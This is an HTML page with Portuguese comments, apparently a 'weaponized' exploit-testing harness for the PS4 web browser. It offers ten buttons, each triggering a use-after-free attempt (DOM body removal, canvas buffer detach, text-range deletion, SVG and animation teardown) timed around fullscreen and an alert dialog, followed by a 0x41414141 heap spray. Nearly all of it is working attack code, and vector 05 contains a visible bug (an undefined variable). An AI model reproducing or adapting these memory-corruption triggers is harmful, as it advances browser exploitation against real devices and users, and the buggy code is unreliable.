<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v230000: The Void</title>
<style>
    body { background: #111; color: #fff; font-family: monospace; text-align: center; padding: 10px; }
    h1 { color: #f00; border-bottom: 1px solid #f00; }
    .btn {
        display: block; width: 100%; padding: 15px; margin: 8px 0;
        background: #300; color: #fff; border: 1px solid #f00;
        font-size: 16px; font-weight: bold; cursor: pointer;
    }
    .btn:hover { background: #f00; color: #000; }
    #status { padding: 10px; border: 1px dashed #f00; color: #ff0; margin-bottom: 10px; }
    #stage { background: #222; width: 100%; height: 50px; margin-top: 10px; border: 1px solid #555; }
</style>
</head>
<body>

<h1>v230000: THE VOID (WEAPONIZED)</h1>

<div id="status">
    1. CLIQUE NO BOTÃO.<br>
    2. ESPERE O ALERTA.<br>
    3. FECHE O ALERTA (X) PARA DETONAR.
</div>

<button class="btn" onclick="void_trap(v01)">01. Body Destruction + Heap Spray</button>
<button class="btn" onclick="void_trap(v02)">02. Infinite Recursion + Spray</button>
<button class="btn" onclick="void_trap(v03)">03. History Flood + Iframe Kill</button>

<button class="btn" onclick="void_trap(v04)">04. Canvas Detach (Timing Fix)</button>
<button class="btn" onclick="void_trap(v05)">05. Video Source Kill (Timing Fix)</button>
<button class="btn" onclick="void_trap(v06)">06. SVG Layout Thrash (Timing Fix)</button>

<button class="btn" onclick="void_trap(v07)">07. Body Replace w/ Doc Fragment</button>
<button class="btn" onclick="void_trap(v08)">08. Fullscreen Element Attribute Fuzz</button>
<button class="btn" onclick="void_trap(v09)">09. CSS Animation State Destroy</button>
<button class="btn" onclick="void_trap(v10)">10. Range Selection UAF + Fullscreen</button>

<div id="stage">ALVO</div>

<script>
    const Stage = document.getElementById('stage');
    const Status = document.getElementById('status');

    // Ferramenta de Heap Spray
    // Tenta preencher a memória liberada com o padrão 0x41414141
    function aggressiveSpray() {
        const spray = [];
        const filler = new Uint32Array(1024 * 16); // 64KB chunks
        filler.fill(0x41414141);
        try {
            for(let i=0; i<2000; i++) spray.push(new Uint32Array(filler));
        } catch(e) {}
        return spray;
    }

    function void_trap(vectorFunc) {
        Status.innerText = "PREPARANDO...";
        Stage.innerHTML = "";
        
        // 1. Configura o cenário
        const target = vectorFunc(Stage);

        // 2. Solicita Fullscreen
        if (target.webkitRequestFullscreen) target.webkitRequestFullscreen();
        else if (target.requestFullscreen) target.requestFullscreen();

        // 3. A ARMADILHA (Timing Otimizado)
        // Usamos requestAnimationFrame para garantir que o navegador
        // processou o pedido de fullscreen, mas ainda não desenhou.
        requestAnimationFrame(() => {
            setTimeout(() => {
                // Pre-Kill (Opcional)
                if(target._preKill) target._preKill();

                // BLOQUEIO
                window.alert("⚠️ ZONA DE PERIGO ⚠️\n\nO renderizador está pausado.\nAo fechar (X), a memória será corrompida.");

                // PÓS-BLOQUEIO (Detonação + Spray)
                if(target._postKill) {
                    target._postKill();
                    // Tenta injetar dados na memória do processo morto/zumbi
                    aggressiveSpray();
                }
                
                Status.innerText = "Executado. Se a tela está preta, SUCESSO.";
            }, 100); // Aumentei levemente para 100ms para garantir que o alerta apareça nos testes que falharam
        });
    }

    // =================================================================
    // 01. Body Destruction + Heap Spray (VENCEDOR OTIMIZADO)
    // =================================================================
    function v01(stage) {
        const d = document.createElement('div');
        d.innerHTML = "<h1>ALVO: BODY</h1>";
        d.style.background = "red";
        stage.appendChild(d);
        
        d._postKill = () => {
            // Nuke total
            document.body.innerHTML = ""; 
            document.body.remove(); // Tenta remover o próprio body
            
            // Cria elementos flutuantes na memória para confundir o renderizador
            const junk = document.createElement('div');
            junk.innerHTML = "JUNK DATA ".repeat(1000);
        };
        return d;
    }

    // =================================================================
    // 02. Infinite Recursion + Spray (VENCEDOR OTIMIZADO)
    // =================================================================
    function v02(stage) {
        const d = document.createElement('div');
        d.innerText = "STACK SMASH";
        stage.appendChild(d);
        
        d._postKill = () => {
            // Estoura a pilha JS enquanto o motor C++ tenta renderizar
            const spray = aggressiveSpray(); // Spray antes de morrer
            function die() { die(); }
            die();
        };
        return d;
    }

    // =================================================================
    // 03. History Flood + Iframe Kill (VENCEDOR OTIMIZADO)
    // =================================================================
    function v03(stage) {
        const d = document.createElement('div');
        d.innerText = "HISTORY BOMB";
        stage.appendChild(d);
        // Cria iframes para aumentar complexidade
        const ifr = document.createElement('iframe');
        document.body.appendChild(ifr);
        
        d._postKill = () => {
            // Navegação massiva + Destruição de contexto
            for(let i=0; i<500; i++) history.pushState({}, "", "/crash"+i);
            ifr.remove();
            history.go(-250);
        };
        return d;
    }

    // =================================================================
    // 04. Canvas Detach (CORRIGIDO)
    // =================================================================
    function v04(stage) {
        const c = document.createElement('canvas');
        const ctx = c.getContext('2d');
        ctx.fillStyle = 'blue'; ctx.fillRect(0,0,300,150);
        stage.appendChild(c);
        
        const w = new Worker(URL.createObjectURL(new Blob(["onmessage=e=>{}"],{type:'text/javascript'})));
        const imgData = ctx.getImageData(0,0,300,150);

        c._postKill = () => {
            // Transfere memória + Spray
            w.postMessage(imgData.data.buffer, [imgData.data.buffer]);
            c.width = 0;
            c.remove();
        };
        return c;
    }

    // =================================================================
    // 05. Video Source Kill (CORRIGIDO)
    // =================================================================
    function v05(stage) {
        const v = document.createElement('video');
        v.controls = true;
        v.src = URL.createObjectURL(new Blob([""], {type:'video/mp4'}));
        stage.appendChild(v);
        
        c._postKill = () => {
            v.src = "";
            v.load();
            v.remove();
            // Tenta forçar o player nativo a ler lixo
            aggressiveSpray();
        };
        return v;
    }

    // =================================================================
    // 06. SVG Layout Thrash (CORRIGIDO)
    // =================================================================
    function v06(stage) {
        stage.innerHTML = '<svg id="svgt"><rect width="100" height="100" fill="green"/></svg>';
        const s = document.getElementById('svgt');
        
        s._postKill = () => {
            s.setAttribute("viewBox", "0 0 0 0");
            s.remove();
            // Recriação rápida para confundir layout
            document.body.appendChild(document.createElement('div'));
        };
        return s;
    }

    // =================================================================
    // 07. Body Replace w/ Doc Fragment (NOVO)
    // Tenta substituir o body por um fragmento vazio durante o render.
    // =================================================================
    function v07(stage) {
        const d = document.createElement('div');
        d.innerHTML = "<h1>DOC FRAG REPLACE</h1>";
        stage.appendChild(d);
        
        d._postKill = () => {
            const frag = document.createDocumentFragment();
            // Substitui o nó raiz
            document.documentElement.replaceChild(frag, document.body);
            aggressiveSpray();
        };
        return d;
    }

    // =================================================================
    // 08. Fullscreen Element Attribute Fuzz (NOVO)
    // Altera milhares de atributos no elemento fullscreen.
    // =================================================================
    function v08(stage) {
        const d = document.createElement('div');
        d.innerHTML = "FUZZER";
        stage.appendChild(d);
        
        d._postKill = () => {
            // Atribuição massiva de atributos lixo
            for(let i=0; i<2000; i++) {
                d.setAttribute("x"+i, "A".repeat(100));
            }
            d.remove();
        };
        return d;
    }

    // =================================================================
    // 09. CSS Animation State Destroy (NOVO)
    // Animação CSS ativa -> Alerta -> Destroi estilo.
    // =================================================================
    function v09(stage) {
        const style = document.createElement('style');
        style.textContent = "@keyframes k { from{opacity:0} to{opacity:1} } .anim { animation: k 1s infinite; }";
        document.head.appendChild(style);
        
        const d = document.createElement('div');
        d.className = "anim";
        d.innerText = "ANIMATION";
        stage.appendChild(d);
        
        d._postKill = () => {
            style.remove(); // Remove definição da animação
            d.remove();     // Remove elemento
            // Força layout
            document.body.offsetWidth;
        };
        return d;
    }

    // =================================================================
    // 10. Range Selection UAF + Fullscreen (NOVO)
    // Seleção de texto ativa no elemento que vai sumir.
    // =================================================================
    function v10(stage) {
        const d = document.createElement('div');
        d.innerText = "SELECTION TARGET";
        stage.appendChild(d);
        
        // Seleciona o texto
        const r = document.createRange();
        r.selectNodeContents(d);
        window.getSelection().addRange(r);
        
        d._postKill = () => {
            d.remove();
            // Tenta acessar a seleção que aponta para o nó morto
            const sel = window.getSelection();
            if(sel.rangeCount > 0) {
                const r = sel.getRangeAt(0);
                r.deleteContents(); // Acesso UAF
            }
            aggressiveSpray();
        };
        return d;
    }

</script>
</body>
</html>
